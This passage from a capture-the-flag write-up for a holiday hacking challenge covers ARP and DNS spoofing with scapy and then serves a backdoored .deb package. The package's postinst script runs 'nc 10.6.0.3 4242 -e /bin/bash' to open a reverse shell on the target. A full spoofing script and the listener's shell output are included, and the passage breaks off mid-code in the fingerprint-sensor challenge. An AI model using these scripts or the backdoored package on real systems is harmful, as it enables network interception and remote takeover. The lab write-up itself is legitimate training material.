<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c3f45bfb4628:~/scripts$ tcpdump -nni eth0
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
15:22:39.811576 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
15:22:40.847481 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
15:22:41.899493 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
</code></pre></div><p>ARP requests are made from the infected host (10.6.6.35) to 10.6.6.53. Given the port, it&rsquo;s probably requesting a DNS server. Use the skeleton in <code>scripts/arp_resp.py</code> and complete the <code>handle_arp_packets</code> method to send an ARP response saying we are 10.6.6.53.</p>
<h4 id="spoofy">Spoofy</h4>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">handle_arp_packets</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="c1"># packet.show()</span>
    <span class="c1"># if arp request, then we need to fill this out to send back our mac as the response</span>
    <span class="k">if</span> <span class="n">ARP</span> <span class="ow">in</span> <span class="n">packet</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">)</span>
        <span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">()</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mh">0x2</span> <span class="c1"># reply</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">plen</span> <span class="o">=</span> <span class="mh">0x4</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">hwlen</span> <span class="o">=</span> <span class="mh">0x6</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">ptype</span> <span class="o">=</span> <span class="mh">0x800</span> <span class="c1"># IPv4</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1"># ethernet</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">macaddr</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
        <span class="n">arp_response</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">ether_resp</span> <span class="o">/</span> <span class="n">arp_response</span>
        <span class="c1"># response.show()</span>
        <span class="n">sendp</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
</code></pre></div><p>Note: Running <code>tshark -V -i eth0</code> gives more details on the sniffed traffic and be great for troubleshooting a not-working-as-intended scapy script.</p>
<p>Trick:  the script is small enough to be transfered to/from the box with base64.</p>
<p>Run the script <code>./arp_resp.py</code> in one tmux pane while sniffing in another tmux pane with <code>tshark -i eth0 -w arp_answer.pcap</code>. The traffic will be saved to a file <code>arp_answer.pcap</code> and can be read with the <code>-r</code> option of tshark.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c3f45bfb4628:~/scripts$ tshark -i eth0 -r arp_answer.pcap
[...]
    4 5.175941200 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
    5 5.200013882 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
    6 5.216299387    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
    7 6.215949834 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
</code></pre></div><p>If the ARP answer is correct, a DNS request (as predicted) is sent next.</p>
<h4 id="resolvy">Resolvy</h4>
<p>The <code>-Y</code> option of tshark adds a display filter, so we can filter on packets containing a DNS layer:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@440e6a396174:~/scripts$ tshark -V -r arp_resp.pcap -Y &#39;dns&#39;
[...]
Domain Name System (query)
    Transaction ID: 0x0000
    Flags: 0x0100 Standard query
        0... .... .... .... = Response: Message is a query
        .000 0... .... .... = Opcode: Standard query (0)
        .... ..0. .... .... = Truncated: Message is not truncated
        .... ...1 .... .... = Recursion desired: Do query recursively
        .... .... .0.. .... = Z: reserved (0)
        .... .... ...0 .... = Non-authenticated data: Unacceptable
    Questions: 1
    Answer RRs: 0
    Authority RRs: 0
    Additional RRs: 0
    Queries
        ftp.osuosl.org: type A, class IN
            Name: ftp.osuosl.org
            [Name Length: 14]
            [Label Count: 3]
            Type: A (Host Address) (1)
            Class: IN (0x0001)
</code></pre></div><p>That should be enough information to complete the skeleton <code>handle_dns_request()</code> in <code>scripts/dns_resp.py</code>.</p>
<p>DNS was definitely harder to get right than ARP! It took a lot of troubleshooting.</p>
<p>These articles helped me craft a correct DNS answer:</p>
<ul>
<li><a href="http://lost-and-found-narihiro.blogspot.com/2016/02/craft-dns-responses-with-python-scapy.html">http://lost-and-found-narihiro.blogspot.com/2016/02/craft-dns-responses-with-python-scapy.html</a></li>
<li><a href="https://web.archive.org/web/20160226122221/http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/">https://web.archive.org/web/20160226122221/http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/</a></li>
</ul>
<p>Final DNS answer:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">handle_dns_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="c1"># Need to change mac addresses, Ip Addresses, and ports below.</span>
    <span class="c1"># We also need</span>
    <span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">MAC</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">SPOOFED_IP</span><span class="p">)</span>
    <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span><span class="p">)</span>  <span class="c1"># need to replace ports</span>
    <span class="n">dns</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span>
        <span class="n">an</span><span class="o">=</span><span class="n">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qname</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="n">ETH0_IP</span><span class="p">),</span>
        <span class="n">ancount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">aa</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">qr</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
        <span class="nb">id</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
        <span class="n">rd</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">rd</span><span class="p">,</span>
        <span class="n">qdcount</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qdcount</span><span class="p">,</span>
        <span class="n">qd</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="p">,</span>
    <span class="p">)</span>
    <span class="n">dns_response</span> <span class="o">=</span> <span class="n">eth</span> <span class="o">/</span> <span class="n">ip</span> <span class="o">/</span> <span class="n">udp</span> <span class="o">/</span> <span class="n">dns</span>
    <span class="n">sendp</span><span class="p">(</span><span class="n">dns_response</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
</code></pre></div><p>I ended up merging both DNS and ARP handling in one script named <code>spoof.py</code> (download <a href="scripts/spoof.py">here</a>):</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>

<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">netifaces</span> <span class="kn">as</span> <span class="nn">ni</span>
<span class="kn">import</span> <span class="nn">uuid</span>

<span class="c1"># Our eth0 ip</span>
<span class="n">ETH0_IP</span> <span class="o">=</span> <span class="n">ni</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="s1">&#39;eth0&#39;</span><span class="p">)[</span><span class="n">ni</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;addr&#39;</span><span class="p">]</span>

<span class="c1"># Our eth0 mac address</span>
<span class="n">MAC</span> <span class="o">=</span> <span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;{:02x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span><span class="mi">8</span><span class="p">)][::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="c1"># destination ip we arp spoofed</span>
<span class="n">SPOOFED_IP</span> <span class="o">=</span> <span class="s2">&#34;10.6.6.53&#34;</span>

<span class="k">def</span> <span class="nf">handle_arp_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="c1"># packet.show()</span>
    <span class="c1"># if arp request, then we need to fill this out to send back our mac as the response</span>
    <span class="k">if</span> <span class="n">ARP</span> <span class="ow">in</span> <span class="n">packet</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">MAC</span><span class="p">)</span>
        <span class="n">arp</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">()</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mh">0x2</span> <span class="c1"># reply</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">plen</span> <span class="o">=</span> <span class="mh">0x4</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">hwlen</span> <span class="o">=</span> <span class="mh">0x6</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">ptype</span> <span class="o">=</span> <span class="mh">0x800</span> <span class="c1"># IPv4</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="mh">0x1</span> <span class="c1"># ethernet</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">MAC</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">SPOOFED_IP</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
        <span class="n">arp</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">eth</span> <span class="o">/</span> <span class="n">arp</span>
        <span class="c1"># response.show()</span>
        <span class="n">sendp</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">handle_dns_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">MAC</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">SPOOFED_IP</span><span class="p">)</span>
    <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span><span class="p">)</span>
    <span class="n">dns</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span>
        <span class="c1"># [DNS].qd.qname vs [DNSQR].qname?</span>
        <span class="n">an</span><span class="o">=</span><span class="n">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qname</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="n">ETH0_IP</span><span class="p">),</span>
        <span class="n">ancount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">aa</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">qr</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
        <span class="nb">id</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
        <span class="n">rd</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">rd</span><span class="p">,</span>
        <span class="n">qdcount</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qdcount</span><span class="p">,</span>
        <span class="n">qd</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="p">,</span>
    <span class="p">)</span>
    <span class="n">dns_response</span> <span class="o">=</span> <span class="n">eth</span> <span class="o">/</span> <span class="n">ip</span> <span class="o">/</span> <span class="n">udp</span> <span class="o">/</span> <span class="n">dns</span>
    <span class="n">sendp</span><span class="p">(</span><span class="n">dns_response</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">dispatcher</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">ARP</span> <span class="ow">in</span> <span class="n">packet</span><span class="p">:</span>
        <span class="n">handle_arp_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">DNS</span> <span class="ow">in</span> <span class="n">packet</span><span class="p">:</span>
        <span class="n">handle_dns_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;huh, got a filtered packet that is neither ARP nor DNS&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># BPF filters</span>
    <span class="n">arp_bpf</span> <span class="o">=</span> <span class="s2">&#34;(arp[6:2] = 1)&#34;</span>

    <span class="n">dns_bpf</span> <span class="o">=</span> <span class="s2">&#34; and &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="p">[</span>
        <span class="s2">&#34;udp dst port 53&#34;</span><span class="p">,</span>                   <span class="c1"># dns</span>
        <span class="s2">&#34;udp[10] &amp; 0x80 = 0&#34;</span><span class="p">,</span>                <span class="c1"># dns request</span>
        <span class="s2">&#34;dst host {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">SPOOFED_IP</span><span class="p">),</span>    <span class="c1"># destination ip we had spoofed (not our real ip)</span>
        <span class="s2">&#34;ether dst host {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">MAC</span><span class="p">)</span>      <span class="c1"># our macaddress since we spoofed the ip to our mac</span>
    <span class="p">]</span> <span class="p">)</span>

    <span class="c1"># sniffing for $count packet(s) that will be sent to a function, while storing none</span>
    <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="s2">&#34;{arp_bpf} or ({dns_bpf})&#34;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">dispatcher</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><p>Our DNS answer worked and triggered something else using TCP and TLS1.3. It&rsquo;s not very clear what&hellip; Let&rsquo;s try again with an HTTP server this time:</p>
<p><img src="img/image-20201229230731060.png" alt="image-20201229230731060"></p>
<p>This time, we can see the malware requesting a .deb file:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">10.6.6.35 - - [29/Dec/2020 22:06:12] &#34;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&#34; 404 -
</code></pre></div><p>Which it obviously doesn&rsquo;t find since it&rsquo;s not provided by our server, yet. :))</p>
<h4 id="embedy">Embedy</h4>
<p>First, we&rsquo;ll create the hierarchy of directories where we should put <code>suriv_amd64.deb</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c58a854bcd83:~$ mkdir -p pub/jfrost/backdoor/
guest@c58a854bcd83:~$ cd pub/jfrost/backdoor/
</code></pre></div><p>The hint gives us a link to a technique to <a href="http://www.wannescolman.be/?p=98">backdoor deb files</a>. The article shows how to modify an existing deb file to embed a payload and add commands to the post-install script to execute it. Bundling a whole ELF payload is a bit overkill in our case, I went the minimalist way: a minimal .deb file containing a netcat binary that will be used to obtain a shell on the target machine.</p>
<p><code>dpkg-deb</code> can build deb file from a filesystem tree. The man page for the build option specifies:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">       -b, --build binary-directory [archive|directory]
              Creates a debian archive from the filesystem tree stored
              in binary-directory. binary-directory must have a DEBIAN
              subdirectory, which contains the control information files
              such as the control file itself. This directory will not
              appear in the binary package&#39;s filesystem archive, but
              instead the files in it will be put in the binary
              package&#39;s control information area.
</code></pre></div><p>A minimal .deb file must have a DEBIAN subdirectory, with a control file. Let&rsquo;s create that directory structure in a directory <code>tmp</code> , where we will be cooking up our deb file.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c58a854bcd83:~/pub/jfrost/backdoor$ mkdir -p tmp/DEBIAN
</code></pre></div><p>The <a href="https://www.debian.org/doc/debian-policy/ch-controlfields.html">documentation on binary packages control files</a> tells us what fields are mandatory:</p>
<ul>
<li>Package</li>
<li>Version</li>
<li>Architecture</li>
<li>Maintainer</li>
<li>Description</li>
</ul>
<p>Putting together a <code>control</code> file with these fields:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c58a854bcd83:~/pub/jfrost/backdoor$ cat &gt; tmp/DEBIAN/control &lt;&lt; EOF
Package: suriv
Version: 1.0
Architecture: amd64
Maintainer: Beep Boop
Description: beep boop I&#39;m a bot
EOF
</code></pre></div><p>Next, we&rsquo;ll create a <code>bin</code> directory and copy the <code>nc</code> binary:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c58a854bcd83:~/pub/jfrost/backdoor$ mkdir tmp/bin
guest@c58a854bcd83:~/pub/jfrost/backdoor$ cp `which nc` .
</code></pre></div><p>Last missing file in our package: a post-install script that executes netcat:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@c58a854bcd83:~/pub/jfrost/backdoor$ cat &gt; tmp/DEBIAN/postinst &lt;&lt; EOF
heredoc&gt; #!/bin/sh
/bin/nc 10.6.0.3 4242 -e /bin/bash &amp;
</code></pre></div><p>note:</p>
<ul>
<li>You need to use the actual IP of eth0, and not the spoofed IP here.</li>
<li>Don&rsquo;t forget to make the <code>postinst</code> script executable.</li>
</ul>
<p>The final structure of the package is:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">.
├── bin
│   └── nc
└── DEBIAN
    ├── control
    └── postinst
</code></pre></div><p>We can then build the package:</p>
<div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">guest</span><span class="err">@</span><span class="nx">c58a854bcd83</span><span class="p">:</span><span class="err">~</span><span class="o">/</span><span class="nx">pub</span><span class="o">/</span><span class="nx">jfrost</span><span class="o">/</span><span class="nx">backdoor</span><span class="err">$</span> <span class="nx">dpkg</span><span class="o">-</span><span class="nx">deb</span> <span class="o">--</span><span class="nx">build</span> <span class="nx">tmp</span> <span class="nx">suriv_amd64</span><span class="p">.</span><span class="nx">deb</span>
<span class="nx">dpkg</span><span class="o">-</span><span class="nx">deb</span><span class="p">:</span> <span class="nx">building</span> <span class="kn">package</span> <span class="err">&#39;</span><span class="nx">suriv</span><span class="err">&#39;</span> <span class="nx">in</span> <span class="err">&#39;</span><span class="nx">suriv_amd64</span><span class="p">.</span><span class="nx">deb</span><span class="err">&#39;</span><span class="p">.</span>
</code></pre></div><p>And we&rsquo;re ready to test the whole thing:</p>
<ol>
<li>
<p>a netcat listener <code>nc -lvp 4242</code> on port 4242</p>
</li>
<li>
<p>a http server on port 80: <code>python -m http.server 80</code></p>
</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">   guest@4d5a1d185e1c:~$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   10.6.6.35 - - [01/Jan/2021 10:34:12] &#34;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&#34; 200 -
</code></pre></div><ol start="3">
<li>the spoofing script: <code>./spoof.py</code></li>
</ol>
<p>And you should get a connection from <code>arp_requester.guestnet0.kringlecastle.com</code> and a shell as jfrost in the netcat listener:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">guest@4d5a1d185e1c:~$ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.6.0.3] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 42982
id
uid=1500(jfrost) gid=1500(jfrost) groups=1500(jfrost)
</code></pre></div><p>With this shell, we can print the content of <code>/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code>. And in the middle of that long elf-legalese thing, the flag is hidden in this sentence:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.
</code></pre></div><p>Answer: <code>Tanta Kringle</code></p>
<h2 id="10-defeat-fingerprint-sensor-">10. Defeat Fingerprint Sensor 🎄🎄🎄</h2>
<p>Description</p>
<blockquote>
<p>Bypass the Santavator fingerprint sensor. Enter Santa&rsquo;s office without Santa&rsquo;s fingerprint.</p>
</blockquote>
<h3 id="solution-10">Solution</h3>
<p>Okay, let&rsquo;s deep dive into <code>app.js</code>! We&rsquo;re looking for information on the <code>Santa's Office</code> button or on the fingerprint scanner.</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">btn1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;button[data-floor=&#34;1&#34;]&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">btn2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;button[data-floor=&#34;1.5&#34;]&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">btn3</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;button[data-floor=&#34;2&#34;]&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">btn4</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;button[data-floor=&#34;3&#34;]&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">btnr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;button[data-floor=&#34;r&#34;]&#39;</span><span class="p">);</span>

<span class="nx">btn1</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="nx">handleBtn</span><span class="p">);</span>
<span class="nx">btn2</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="nx">handleBtn</span><span class="p">);</span>
<span class="nx">btn3</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="nx">handleBtn</span><span class="p">);</span>
<span class="nx">btn4</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="nx">handleBtn4</span><span class="p">);</span>
<span class="nx">btnr</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="nx">handleBtn</span><span class="p">);</span>
</code></pre></div><p>The list of the lift&rsquo;s buttons is defined at line 383. The last one before the roof is Santa&rsquo;s Office, so btn4 is the button we want. What&rsquo;s also interesting here, btn4 the only button that has a different handler: <code>handleBtn4</code>, while all the other buttons have <code>handleBtn</code>.</p>
<p>Let&rsquo;s compare the two handlers:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">handleBtn</span> <span class="o">=</span> <span class="nx">event</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">targetFloor</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">currentTarget</span><span class="p">.</span><span class="nx">attributes</span><span class="p">[</span><span class="s1">&#39;data-floor&#39;</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
  <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
    <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
    <span class="nx">url</span><span class="o">:</span> <span class="nx">POST_URL</span><span class="p">,</span>
    <span class="nx">dataType</span><span class="o">:</span> <span class="s1">&#39;json&#39;</span><span class="p">,</span>
